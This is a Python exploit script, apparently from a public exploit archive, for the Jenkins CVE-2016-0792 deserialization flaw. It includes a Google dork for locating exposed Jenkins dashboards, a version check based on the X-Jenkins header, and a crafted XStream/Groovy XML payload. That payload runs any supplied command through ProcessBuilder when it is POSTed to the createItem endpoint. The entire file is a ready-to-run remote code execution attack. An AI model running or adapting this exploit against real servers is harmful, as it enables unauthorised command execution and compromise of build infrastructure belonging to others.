import random
import string
from decimal import Decimal

import requests
from requests.exceptions import RequestException

# Exploit Title: Jenkins CVE-2016-0792 Deserialization Remote Exploit
# Google Dork: intitle: "Dashboard [Jenkins]" + "Manage Jenkins"
# Date: 30-07-2017
# Exploit Author: Janusz Piechówka
# Github: https://github.com/jpiechowka/jenkins-cve-2016-0792
# Vendor Homepage: https://jenkins.io/
# Version: Versions before 1.650 and LTS before 1.642.2
# Tested on: Debian
# CVE : CVE-2016-0792


def prepare_payload(command):
    splitCommand = command.split()
    preparedCommands = ''

    for entry in splitCommand:
        preparedCommands += f'<string>{entry}</string>'

    xml = f'''
        <map>
          <entry>
            <groovy.util.Expando>
              <expandoProperties>
                <entry>
                  <string>hashCode</string>
                  <org.codehaus.groovy.runtime.MethodClosure>
                    <delegate class="groovy.util.Expando"/>
                    <owner class="java.lang.ProcessBuilder">
                      <command>{preparedCommands}</command>
                    </owner>
                    <method>start</method>
                  </org.codehaus.groovy.runtime.MethodClosure>
                </entry>
              </expandoProperties>
            </groovy.util.Expando>
            <int>1</int>
          </entry>
        </map>'''

    return xml


def exploit(url, command):
    print(f'[*] STARTING')
    try:
        print(f'[+] Trying to exploit Jenkins running at address: {url}')
        # Perform initial URL check to see if server is online and returns correct response code using HEAD request
        headResponse = requests.head(url, timeout=30)
        if headResponse.status_code == requests.codes.ok:
            print(f'[+] Server online and responding | RESPONSE: {headResponse.status_code}')
            # Check if X-Jenkins header containing version is present then proceed
            jenkinsVersionHeader = headResponse.headers.get('X-Jenkins')
            if jenkinsVersionHeader is not None:
                # Strip version after second dot from header to perform conversion to Decimal
                stripCharacter = "."
                strippedVersion = stripCharacter.join(jenkinsVersionHeader.split(stripCharacter)[:2])
                # Perform basic version check
                if Decimal(strippedVersion) < 1.650:
                    print(f'[+] Jenkins version: {Decimal(strippedVersion)} | VULNERABLE')
                    # Prepare payload
                    payload = prepare_payload(command)
                    # Prepare POST url
                    randomJobName = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.digits) for _ in range(8))
                    if url.endswith('/'):
                        postUrl = f'{url}createItem?name={randomJobName}'
                    else:
                        postUrl = f'{url}/createItem?name={randomJobName}'
                    print(f'[+] Will POST to {postUrl}')
                    # Try to execute passed command
                    postResponse = requests.post(postUrl, data=payload, headers={'Content-Type': 'application/xml'})
                    print(f'[+] Exploit launched ')
                    # 500 response code is ok here
                    print(f'[+] Response code: {postResponse.status_code} ')
                    if postResponse.status_code == 500:
                        print('[+] SUCCESS')
                    else:
                        print('[-][ERROR] EXPLOIT LAUNCHED, BUT WRONG RESPONSE CODE RETURNED')
                else:
                    print(f'[-][ERROR] Version {Decimal(strippedVersion)} is not vulnerable')
            else:
                print(f'[-][ERROR] X-Jenkins header not present, check if Jenkins is actually running at {url}')
        else:
            print(f'[-][ERROR] {url} Server did not return success response code | RESPONSE: {headResponse.status_code}')
    except RequestException as ex:
        print(f'[-] [ERROR] Request exception: {ex}')
    print('[*] FINISHED')